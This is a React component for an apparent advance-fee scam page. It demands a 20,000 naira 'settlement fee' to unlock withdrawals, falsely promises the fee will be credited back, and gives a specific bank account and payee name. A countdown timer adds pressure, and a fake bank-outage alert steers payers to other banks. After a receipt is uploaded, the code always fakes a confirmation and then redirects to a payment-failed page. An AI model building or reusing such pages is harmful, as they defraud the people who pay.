
import React, { useState, useEffect } from 'react';
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "@/components/ui/sonner";
import { useNavigate } from 'react-router-dom';
import PaymentConfirmation from './PaymentConfirmation';

const PaymentDetails: React.FC = () => {
  const navigate = useNavigate();
  const [file, setFile] = useState<File | null>(null);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [showOpayAlert, setShowOpayAlert] = useState(true); // Show alert on load

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else {
      navigate('/payment-failed');
    }
  }, [timeLeft, navigate]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const selectedFile = e.target.files[0];
      if (!selectedFile.type.includes('image/png') && !selectedFile.type.includes('image/jpeg')) {
        toast.error("Please upload only PNG or JPG files");
        return;
      }
      setFile(selectedFile);
    }
  };

  const handlePayment = (e: React.FormEvent) => {
    e.preventDefault();

    if (!file) {
      toast.error("Please upload your payment receipt");
      return;
    }

    setIsSubmitting(true);
    setShowConfirmation(true);
    toast.success("Confirming payment...");

    setTimeout(() => {
      setIsSubmitting(false);
      setShowConfirmation(false);
      navigate('/payment-failed');
    }, 7000);
  };

  return (
    <>
      {showOpayAlert && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-sm text-center shadow-lg">
            <div className="mb-4">
              <div className="text-green-600 text-4xl">⏺️</div>
              <h2 className="text-xl font-bold text-red-600">Opay Service Down</h2>
              <p className="text-gray-700 mt-2">
                Please do not use Opay bank for payments at this time.
              </p>
              <div className="mt-4 bg-red-100 text-red-800 p-3 rounded text-sm">
                The Opay bank service is currently experiencing issues. Please use other supported banks for your payment.
              </div>
            </div>
            <Button
              onClick={() => setShowOpayAlert(false)}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
            >
              I Understand
            </Button>
          </div>
        </div>
      )}

      {showConfirmation && <PaymentConfirmation />}

      <div className="w-full max-w-md bg-white rounded-lg p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-2">Make Payment to Complete Activation</h2>
        <p className="text-gray-500 mb-6">
          Please make a payment of 20,000 naira to complete your activation
        </p>

        <div className="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
          <div className="flex items-start">
            <div className="flex-shrink-0 text-blue-500">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"/>
                <path d="M12 16v-4"/>
                <path d="M12 8h.01"/>
              </svg>
            </div>
            <p className="ml-3 text-blue-700">
              A settlement fee of NGN 20,000.00 is required to authorize withdrawals. This fee will be credited back with your withdrawal once authorized.
            </p>
          </div>
          <div className="mt-2 text-right">
            <div className="inline-flex items-center px-2.5 py-0.5 rounded-md text-sm font-medium bg-yellow-100 text-yellow-800">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-1">
                <circle cx="12" cy="12" r="10"/>
                <polyline points="12 6 12 12 16 14"/>
              </svg>
              {formatTime(timeLeft)}
            </div>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium mb-1">Account Number</label>
            <div className="flex">
              <Input value="1035319866" readOnly className="bg-gray-50" />
              <Button variant="outline" className="ml-2 px-2" onClick={() => {
                navigator.clipboard.writeText("1035319866");
                toast.success("Account number copied to clipboard");
              }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                </svg>
              </Button>
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Bank</label>
            <Input value="Carbon" readOnly className="bg-gray-50" />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Account Name</label>
            <Input value="Sunday chinemerem" readOnly className="bg-gray-50" />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Amount</label>
            <Input value="20,000 naira" readOnly className="bg-gray-50" />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Upload Payment Receipt (PNG or JPG)</label>
            <Input
              type="file"
              accept=".png,.jpg,.jpeg"
              onChange={handleFileChange}
              className="cursor-pointer"
              disabled={isSubmitting}
            />
          </div>

          <Button 
            onClick={handlePayment}
            className="w-full bg-bluepay hover:bg-bluepay-600"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <div className="flex items-center justify-center">
                <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-t-transparent border-white"></div>
                Confirming Payment...
              </div>
            ) : (
              "I have made payment"
            )}
          </Button>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
               
